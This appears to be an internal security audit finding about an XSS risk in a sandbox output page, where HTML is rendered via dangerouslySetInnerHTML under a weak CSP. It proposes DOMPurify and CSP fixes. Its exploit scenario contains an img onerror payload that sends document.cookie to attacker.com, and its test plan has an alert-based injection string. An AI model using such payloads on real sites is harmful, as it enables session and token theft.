# Sandbox HTML output rendered via `dangerouslySetInnerHTML` after client-side allowlist sanitizer

**Status:** DEPRIORITIZED — feature disabled in cloud as of 2026-04-30; owner not actively maintaining. Severity rating retained to reflect technical risk; treat as low-priority until the feature is re-enabled.

- Slug: sandbox-output-html-rendered-with-dangerouslysetinnerhtml
- Severity: Medium
- Cloud impact: Yes
- Confidence: Medium
- Affected files / endpoints: `signalpilot/web/app/sandboxes/[id]/page.tsx:39-77,523`

Back to [issues.md](issues.md)

---

## Problem

The sandbox output page renders HTML returned from sandbox execution using `dangerouslySetInnerHTML`:

```typescript
// app/sandboxes/[id]/page.tsx:523 (approximate)
<div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />
```

A client-side sanitizer is applied before this. The sanitizer allows only table-related HTML elements (`table`, `thead`, `tbody`, `tr`, `th`, `td`) and a limited set of attributes (`colspan`, `rowspan`, `class`). This is a careful allowlist approach.

However, two factors reduce confidence in this protection:

1. **CSP allows `'unsafe-inline'` and `'unsafe-eval'`** (`middleware.ts:29` — finding [csp-allows-unsafe-inline-and-unsafe-eval](csp-allows-unsafe-inline-and-unsafe-eval-proposal.md)). The CSP is the second line of defense. With `'unsafe-inline'` enabled, if any HTML injection bypasses the sanitizer, it results in script execution in the browser.

2. **`DOMParser.parseFromString` in `text/html` mode** executes `<img onerror>` handlers and other event attributes during parsing in some browser/context combinations. The sanitizer removes these during the post-parse walk, but there is a theoretical window. Modern browsers in standard mode do not execute scripts during `text/html` parsing, but `<img onerror>` and similar event handlers that fire during DOM construction (not just script execution) may still trigger before the sanitizer's walk completes.

Confidence is Medium because the sanitizer is careful and modern browsers generally protect against DOM-construction attacks. The risk is amplified significantly by the `'unsafe-inline'` CSP.

---

## Impact

- If the sanitizer is bypassed (e.g., via a browser-specific parsing quirk or a new HTML5 vector): stored XSS in the sandbox output page.
- With `'unsafe-inline'` CSP: XSS leads to session token theft, API key exfiltration, Clerk JWT access.
- Multi-tenant impact: the XSS runs in the context of the viewing user's session, not the sandbox creator's session.

---

## Exploit scenario

1. Attacker has access to sandbox execution (either their own sandbox or cross-tenant via finding [sandboxes-store-not-org-scoped](sandboxes-store-not-org-scoped-proposal.md)).
2. Attacker returns crafted HTML from sandbox execution output:

```html
<table><tr><td><img src=x class="allowed-class" onerror="fetch('https://attacker.com/?token='+document.cookie)"></td></tr></table>
```

3. Sanitizer removes `onerror` attribute (correct behavior).
4. If sanitizer is bypassed (via a browser quirk or future regression), the `onerror` fires.
5. With `'unsafe-inline'` CSP, any injected `<script>` tag would also execute.

**Simpler current attack:**
- The sanitizer correctly handles known vectors. The primary risk today is that CSP `'unsafe-inline'` means a future sanitizer regression (e.g., a new HTML5 vector discovered) immediately becomes an XSS.

---

## Affected surface

- Files: `signalpilot/web/app/sandboxes/[id]/page.tsx:39-77,523`
- Endpoints: Sandbox output page (client-side rendering)
- Auth modes: Cloud (authenticated user viewing sandbox output)

---

## Proposed fix

1. **Use DOMPurify instead of a hand-rolled sanitizer:**

```typescript
import DOMPurify from "dompurify";

const config: DOMPurify.Config = {
  ALLOWED_TAGS: ["table", "thead", "tbody", "tfoot", "tr", "th", "td", "caption"],
  ALLOWED_ATTR: ["colspan", "rowspan", "class", "scope"],
  FORBID_ATTR: ["style", "id"],
  RETURN_DOM_FRAGMENT: false,
};

const sanitizedHtml = DOMPurify.sanitize(rawHtml, config);
```

DOMPurify is the industry standard; it is actively maintained and handles edge cases that hand-rolled sanitizers miss.

2. **Fix the CSP** (see finding [csp-allows-unsafe-inline-and-unsafe-eval](csp-allows-unsafe-inline-and-unsafe-eval-proposal.md)). With a nonce-based CSP and no `'unsafe-inline'`, XSS from HTML injection cannot execute scripts even if the sanitizer is bypassed.

3. **Consider server-side rendering to plain structured data** rather than rendering HTML. The sandbox output is a table — render it as JSON data and construct the React table component from it, never passing raw HTML to `dangerouslySetInnerHTML`.

---

## Verification / test plan

**Unit tests:**
1. `test_sanitizer_blocks_script_tag` — input `<script>alert(1)</script>`, assert removed.
2. `test_sanitizer_blocks_onerror` — input `<img onerror="...">`, assert `onerror` removed.
3. `test_sanitizer_allows_table_elements` — valid table HTML, assert preserved.
4. `test_sanitizer_blocks_style_attribute` — `<td style="background:url(javascript:...)">`, assert removed.

**Manual checklist:**
- Inject `<table><tr><td><img src=x onerror="alert(document.domain)"></td></tr></table>` via sandbox output.
- Verify browser does not show alert.
- After fix: verify CSP blocks inline scripts in the Network tab.

---

## Rollout / migration notes

- DOMPurify adds ~40KB to the bundle (gzipped ~15KB). Acceptable.
- Existing sandbox outputs are HTML strings; they will be re-sanitized by DOMPurify on next view.
- CSP fix is a separate PR (finding #31).
- Rollback: revert to current sanitizer; CSP fix is independent.

**Related findings:** [csp-allows-unsafe-inline-and-unsafe-eval](csp-allows-unsafe-inline-and-unsafe-eval-proposal.md)
